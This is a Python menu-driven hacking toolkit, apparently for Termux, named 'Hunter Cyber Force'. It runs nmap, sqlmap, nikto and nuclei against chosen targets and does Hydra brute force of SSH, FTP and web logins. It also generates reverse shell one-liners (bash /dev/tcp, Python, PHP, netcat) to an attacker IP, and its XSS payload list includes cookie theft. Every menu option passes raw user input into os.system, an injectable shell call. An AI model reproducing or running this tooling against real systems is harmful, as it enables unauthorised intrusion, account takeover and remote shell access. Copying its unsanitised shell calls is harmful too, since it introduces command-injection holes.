#!/usr/bin/env python3
# ================================================================
#   HUNTER CYBER FORCE — Main Tool
#   Author  : HCF Team
#   Version : 2.0
#   GitHub  : github.com/sadnamaltamim-HCF/HunterCyberForce
# ================================================================

import os
import sys
import time
import socket
import subprocess
import platform
import datetime

# ── Colors ───────────────────────────────────────────────────────
R  = "\033[0;31m"
G  = "\033[0;32m"
Y  = "\033[1;33m"
C  = "\033[0;36m"
W  = "\033[1;37m"
B  = "\033[0;34m"
M  = "\033[0;35m"
RS = "\033[0m"

# ── Utilities ────────────────────────────────────────────────────
def clear():
    os.system("clear")

def run(cmd):
    os.system(cmd)

def pause():
    input(Y + "\n  [↵] Press Enter to continue..." + RS)

def get_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ── Banner ───────────────────────────────────────────────────────
def banner():
    clear()
    print(R + """
  ██╗  ██╗ ██████╗███████╗
  ██║  ██║██╔════╝██╔════╝
  ███████║██║     █████╗  
  ██╔══██║██║     ██╔══╝  
  ██║  ██║╚██████╗██║     
  ╚═╝  ╚═╝ ╚═════╝╚═╝    """ + RS)
    print(C + "  ══════ HUNTER CYBER FORCE ══════" + RS)
    print(W + f"  [*] Version  : 2.0" + RS)
    print(W + f"  [*] Time     : {get_time()}" + RS)
    print(W + f"  [*] Platform : {platform.system()} {platform.release()}" + RS)
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(W + f"  [*] Device   : {hostname}" + RS)
        print(W + f"  [*] Local IP : {local_ip}" + RS)
    except:
        pass
    print(C + "  ─────────────────────────────────" + RS)
    print()

# ── Main Menu ────────────────────────────────────────────────────
def main_menu():
    banner()
    print(Y + "  ══ MAIN MENU ══" + RS)
    print()
    print(W + "  [01] " + C + "🔍 Reconnaissance" + RS)
    print(W + "  [02] " + C + "🌐 Web Tools" + RS)
    print(W + "  [03] " + C + "🔑 Password Tools" + RS)
    print(W + "  [04] " + C + "📡 Network Tools" + RS)
    print(W + "  [05] " + C + "💻 System Info" + RS)
    print(W + "  [06] " + C + "🛠️  Utility Tools" + RS)
    print(W + "  [07] " + C + "☁️  Tunnel Tools" + RS)
    print(W + "  [08] " + C + "📦 Package Manager" + RS)
    print(W + "  [00] " + R + "❌ Exit" + RS)
    print()
    return input(Y + "  HCF » " + RS).strip()

# ══════════════════════════════════════════════════════════════════
# [01] RECONNAISSANCE
# ══════════════════════════════════════════════════════════════════
def menu_recon():
    while True:
        banner()
        print(Y + "  ══ RECONNAISSANCE ══" + RS)
        print()
        print(W + "  [1] " + C + "Nmap Port Scan" + RS)
        print(W + "  [2] " + C + "Nmap Full Scan (All ports)" + RS)
        print(W + "  [3] " + C + "Nmap OS Detection" + RS)
        print(W + "  [4] " + C + "WHOIS Lookup" + RS)
        print(W + "  [5] " + C + "DNS Lookup" + RS)
        print(W + "  [6] " + C + "Subdomain Finder (Subfinder)" + RS)
        print(W + "  [7] " + C + "Ping Target" + RS)
        print(W + "  [8] " + C + "Traceroute" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Recon » " + RS).strip()

        if ch == "1":
            t = input(C + "  Target IP/Domain: " + RS)
            run(f"nmap -sV -sC {t}")
            pause()
        elif ch == "2":
            t = input(C + "  Target IP/Domain: " + RS)
            run(f"nmap -p- {t}")
            pause()
        elif ch == "3":
            t = input(C + "  Target IP/Domain: " + RS)
            run(f"nmap -O {t}")
            pause()
        elif ch == "4":
            t = input(C + "  Domain: " + RS)
            run(f"whois {t}")
            pause()
        elif ch == "5":
            t = input(C + "  Domain: " + RS)
            run(f"nslookup {t}")
            pause()
        elif ch == "6":
            t = input(C + "  Domain: " + RS)
            run(f"subfinder -d {t}")
            pause()
        elif ch == "7":
            t = input(C + "  Target: " + RS)
            run(f"ping -c 4 {t}")
            pause()
        elif ch == "8":
            t = input(C + "  Target: " + RS)
            run(f"traceroute {t}")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [02] WEB TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_web():
    while True:
        banner()
        print(Y + "  ══ WEB TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "SQLMap (SQL Injection)" + RS)
        print(W + "  [2] " + C + "SQLMap (Auto + DBs)" + RS)
        print(W + "  [3] " + C + "WhatWeb Fingerprint" + RS)
        print(W + "  [4] " + C + "Nikto Web Scanner" + RS)
        print(W + "  [5] " + C + "Nuclei Vuln Scanner" + RS)
        print(W + "  [6] " + C + "Curl Request" + RS)
        print(W + "  [7] " + C + "HTTP Headers Check" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Web » " + RS).strip()

        if ch == "1":
            url = input(C + "  Target URL (with param): " + RS)
            run(f"sqlmap -u '{url}' --batch")
            pause()
        elif ch == "2":
            url = input(C + "  Target URL: " + RS)
            run(f"sqlmap -u '{url}' --batch --dbs")
            pause()
        elif ch == "3":
            url = input(C + "  Target URL: " + RS)
            run(f"whatweb {url}")
            pause()
        elif ch == "4":
            url = input(C + "  Target URL: " + RS)
            run(f"perl ~/tools/nikto/program/nikto.pl -h {url}")
            pause()
        elif ch == "5":
            url = input(C + "  Target URL: " + RS)
            run(f"nuclei -u {url}")
            pause()
        elif ch == "6":
            url = input(C + "  URL: " + RS)
            run(f"curl -s {url}")
            pause()
        elif ch == "7":
            url = input(C + "  URL: " + RS)
            run(f"curl -I {url}")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [03] PASSWORD TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_password():
    while True:
        banner()
        print(Y + "  ══ PASSWORD TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "Hydra SSH Brute Force" + RS)
        print(W + "  [2] " + C + "Hydra FTP Brute Force" + RS)
        print(W + "  [3] " + C + "Hydra HTTP Login Brute Force" + RS)
        print(W + "  [4] " + C + "Hash Identifier" + RS)
        print(W + "  [5] " + C + "MD5 / SHA256 Generator" + RS)
        print(W + "  [6] " + C + "Wordlist Generator (Custom)" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Pass » " + RS).strip()

        if ch == "1":
            ip   = input(C + "  Target IP: " + RS)
            user = input(C + "  Username: " + RS)
            wl   = input(C + "  Wordlist path: " + RS)
            run(f"hydra -l {user} -P {wl} ssh://{ip}")
            pause()
        elif ch == "2":
            ip   = input(C + "  Target IP: " + RS)
            user = input(C + "  Username: " + RS)
            wl   = input(C + "  Wordlist path: " + RS)
            run(f"hydra -l {user} -P {wl} ftp://{ip}")
            pause()
        elif ch == "3":
            url  = input(C + "  Login URL: " + RS)
            user = input(C + "  Username: " + RS)
            wl   = input(C + "  Wordlist path: " + RS)
            post = input(C + "  POST data (user=^USER^&pass=^PASS^): " + RS)
            fail = input(C + "  Fail string: " + RS)
            run(f"hydra -l {user} -P {wl} {url} http-post-form '{post}:{fail}'")
            pause()
        elif ch == "4":
            h = input(C + "  Enter hash: " + RS)
            # Simple hash length identifier
            length = len(h)
            types = {32: "MD5", 40: "SHA1", 56: "SHA224",
                     64: "SHA256", 96: "SHA384", 128: "SHA512"}
            print(G + f"  Possible type: {types.get(length, 'Unknown')}" + RS)
            pause()
        elif ch == "5":
            import hashlib
            text = input(C + "  Enter text: " + RS)
            print(G + f"  MD5    : {hashlib.md5(text.encode()).hexdigest()}" + RS)
            print(G + f"  SHA256 : {hashlib.sha256(text.encode()).hexdigest()}" + RS)
            print(G + f"  SHA512 : {hashlib.sha512(text.encode()).hexdigest()}" + RS)
            pause()
        elif ch == "6":
            name   = input(C + "  Your name: " + RS)
            birth  = input(C + "  Birthdate (ddmmyyyy): " + RS)
            nick   = input(C + "  Nickname: " + RS)
            fname  = f"wordlist_{name}.txt"
            words  = set()
            for w in [name, nick, birth]:
                words.update([w, w+"123", w+"@123", w+"#1",
                               w.lower(), w.upper(),
                               w+"2024", w+"2025", w+"2026",
                               name+birth, nick+birth])
            with open(fname, "w") as f:
                f.write("\n".join(words))
            print(G + f"  Wordlist saved: {fname} ({len(words)} words)" + RS)
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [04] NETWORK TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_network():
    while True:
        banner()
        print(Y + "  ══ NETWORK TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "My Public IP" + RS)
        print(W + "  [2] " + C + "Local Network Scan" + RS)
        print(W + "  [3] " + C + "Open Ports (localhost)" + RS)
        print(W + "  [4] " + C + "IP Geolocation" + RS)
        print(W + "  [5] " + C + "MAC Address Lookup" + RS)
        print(W + "  [6] " + C + "Network Interfaces" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Net » " + RS).strip()

        if ch == "1":
            run("curl -s ifconfig.me && echo")
            pause()
        elif ch == "2":
            subnet = input(C + "  Subnet (e.g. 192.168.1.0/24): " + RS)
            run(f"nmap -sn {subnet}")
            pause()
        elif ch == "3":
            run("nmap -sT localhost")
            pause()
        elif ch == "4":
            ip = input(C + "  IP Address: " + RS)
            run(f"curl -s https://ipinfo.io/{ip}")
            pause()
        elif ch == "5":
            mac = input(C + "  MAC Address: " + RS)
            run(f"curl -s https://api.macvendors.com/{mac}")
            pause()
        elif ch == "6":
            run("ip addr show")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [05] SYSTEM INFO
# ══════════════════════════════════════════════════════════════════
def menu_sysinfo():
    banner()
    print(Y + "  ══ SYSTEM INFO ══" + RS)
    print()

    # Device info
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except:
        hostname = "N/A"
        local_ip = "N/A"

    print(C + f"  Hostname    : " + W + hostname + RS)
    print(C + f"  Local IP    : " + W + local_ip + RS)
    print(C + f"  Platform    : " + W + platform.system() + RS)
    print(C + f"  Release     : " + W + platform.release() + RS)
    print(C + f"  Python      : " + W + platform.python_version() + RS)
    print(C + f"  Time        : " + W + get_time() + RS)
    print()

    # Public IP
    print(Y + "  [*] Fetching public IP..." + RS)
    run("curl -s ifconfig.me && echo")
    print()

    # Storage
    print(Y + "  [*] Storage:" + RS)
    run("df -h /data/data/com.termux 2>/dev/null || df -h ~")
    print()

    # Memory
    print(Y + "  [*] Memory:" + RS)
    run("free -h 2>/dev/null || cat /proc/meminfo | head -5")

    pause()

# ══════════════════════════════════════════════════════════════════
# [06] UTILITY TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_utility():
    while True:
        banner()
        print(Y + "  ══ UTILITY TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "Base64 Encode/Decode" + RS)
        print(W + "  [2] " + C + "URL Encode/Decode" + RS)
        print(W + "  [3] " + C + "Reverse Shell Generator" + RS)
        print(W + "  [4] " + C + "Payload Encoder (XSS)" + RS)
        print(W + "  [5] " + C + "String to Hex / Hex to String" + RS)
        print(W + "  [6] " + C + "Port Number Info" + RS)
        print(W + "  [7] " + C + "Git Quick Push" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Util » " + RS).strip()

        if ch == "1":
            import base64
            mode = input(C + "  [E]ncode or [D]ecode? " + RS).strip().upper()
            text = input(C + "  Input: " + RS)
            if mode == "E":
                print(G + "  Result: " + base64.b64encode(text.encode()).decode() + RS)
            else:
                try:
                    print(G + "  Result: " + base64.b64decode(text).decode() + RS)
                except:
                    print(R + "  Invalid base64!" + RS)
            pause()
        elif ch == "2":
            from urllib.parse import quote, unquote
            mode = input(C + "  [E]ncode or [D]ecode? " + RS).strip().upper()
            text = input(C + "  Input: " + RS)
            if mode == "E":
                print(G + "  Result: " + quote(text) + RS)
            else:
                print(G + "  Result: " + unquote(text) + RS)
            pause()
        elif ch == "3":
            ip   = input(C + "  Your IP (attacker): " + RS)
            port = input(C + "  Your Port: " + RS)
            print()
            print(Y + "  ── Reverse Shell Payloads ──" + RS)
            print(C + f"  [Bash]   " + W + f"bash -i >& /dev/tcp/{ip}/{port} 0>&1" + RS)
            print(C + f"  [Python] " + W + f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'" + RS)
            print(C + f"  [PHP]    " + W + f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" + RS)
            print(C + f"  [Netcat] " + W + f"nc {ip} {port} -e /bin/bash" + RS)
            print(C + f"  [Netcat2]" + W + f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f" + RS)
            print()
            print(Y + "  Listener command:" + RS)
            print(W + f"  nc -lvnp {port}" + RS)
            pause()
        elif ch == "4":
            print(Y + "  ── XSS Payloads ──" + RS)
            payloads = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '<body onload=alert(1)>',
                '"><img src=x onerror=alert(document.cookie)>',
            ]
            for i, p in enumerate(payloads, 1):
                print(W + f"  [{i}] " + C + p + RS)
            pause()
        elif ch == "5":
            mode = input(C + "  [E]ncode (str→hex) or [D]ecode (hex→str)? " + RS).strip().upper()
            text = input(C + "  Input: " + RS)
            if mode == "E":
                print(G + "  Result: " + text.encode().hex() + RS)
            else:
                try:
                    print(G + "  Result: " + bytes.fromhex(text).decode() + RS)
                except:
                    print(R + "  Invalid hex!" + RS)
            pause()
        elif ch == "6":
            ports_info = {
                "21": "FTP", "22": "SSH", "23": "Telnet",
                "25": "SMTP", "53": "DNS", "80": "HTTP",
                "110": "POP3", "143": "IMAP", "443": "HTTPS",
                "445": "SMB", "3306": "MySQL", "3389": "RDP",
                "5432": "PostgreSQL", "6379": "Redis", "8080": "HTTP-Alt",
                "27017": "MongoDB"
            }
            print(Y + "  ── Common Ports ──" + RS)
            for port, name in ports_info.items():
                print(W + f"  {port:>5} " + C + f"→ {name}" + RS)
            pause()
        elif ch == "7":
            msg = input(C + "  Commit message: " + RS)
            run(f'git add . && git commit -m "{msg}" && git push')
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [07] TUNNEL TOOLS
# ══════════════════════════════════════════════════════════════════
def menu_tunnel():
    while True:
        banner()
        print(Y + "  ══ TUNNEL TOOLS ══" + RS)
        print()
        print(W + "  [1] " + C + "Ngrok HTTP Tunnel" + RS)
        print(W + "  [2] " + C + "Ngrok TCP Tunnel" + RS)
        print(W + "  [3] " + C + "Cloudflare Tunnel" + RS)
        print(W + "  [4] " + C + "Start Python HTTP Server" + RS)
        print(W + "  [5] " + C + "Start PHP Server" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Tunnel » " + RS).strip()

        if ch == "1":
            port = input(C + "  Port: " + RS)
            run(f"ngrok http {port}")
            pause()
        elif ch == "2":
            port = input(C + "  Port: " + RS)
            run(f"ngrok tcp {port}")
            pause()
        elif ch == "3":
            port = input(C + "  Local Port: " + RS)
            run(f"cloudflared tunnel --url http://localhost:{port}")
            pause()
        elif ch == "4":
            port = input(C + "  Port (default 8080): " + RS) or "8080"
            print(G + f"  Server started at http://localhost:{port}" + RS)
            run(f"python3 -m http.server {port}")
            pause()
        elif ch == "5":
            port = input(C + "  Port (default 8080): " + RS) or "8080"
            run(f"php -S 0.0.0.0:{port}")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# [08] PACKAGE MANAGER
# ══════════════════════════════════════════════════════════════════
def menu_pkg():
    while True:
        banner()
        print(Y + "  ══ PACKAGE MANAGER ══" + RS)
        print()
        print(W + "  [1] " + C + "Update all packages" + RS)
        print(W + "  [2] " + C + "Install a package (pkg)" + RS)
        print(W + "  [3] " + C + "Install a Python lib (pip)" + RS)
        print(W + "  [4] " + C + "List installed packages" + RS)
        print(W + "  [5] " + C + "Remove a package" + RS)
        print(W + "  [0] " + R + "Back" + RS)
        print()
        ch = input(Y + "  HCF/Pkg » " + RS).strip()

        if ch == "1":
            run("pkg update -y && pkg upgrade -y")
            pause()
        elif ch == "2":
            pkg = input(C + "  Package name: " + RS)
            run(f"pkg install {pkg} -y")
            pause()
        elif ch == "3":
            lib = input(C + "  Library name: " + RS)
            run(f"pip install {lib}")
            pause()
        elif ch == "4":
            run("pkg list-installed 2>/dev/null | head -50")
            pause()
        elif ch == "5":
            pkg = input(C + "  Package to remove: " + RS)
            run(f"pkg uninstall {pkg} -y")
            pause()
        elif ch == "0":
            break

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════
def main():
    menu_map = {
        "1": menu_recon,
        "2": menu_web,
        "3": menu_password,
        "4": menu_network,
        "5": menu_sysinfo,
        "6": menu_utility,
        "7": menu_tunnel,
        "8": menu_pkg,
    }

    while True:
        ch = main_menu()
        if ch == "0":
            clear()
            print(R + """
  ██╗  ██╗ ██████╗███████╗
  ██║  ██║██╔════╝██╔════╝
  ███████║██║     █████╗  
  ██╔══██║██║     ██╔══╝  
  ██║  ██║╚██████╗██║     
  ╚═╝  ╚═╝ ╚═════╝╚═╝    """ + RS)
            print(C + "  Stay Sharp. Stay Silent. 🔴" + RS)
            print()
            sys.exit(0)
        elif ch in menu_map:
            menu_map[ch]()
        else:
            print(R + "  [!] Invalid option!" + RS)
            time.sleep(0.8)

if __name__ == "__main__":
    main()
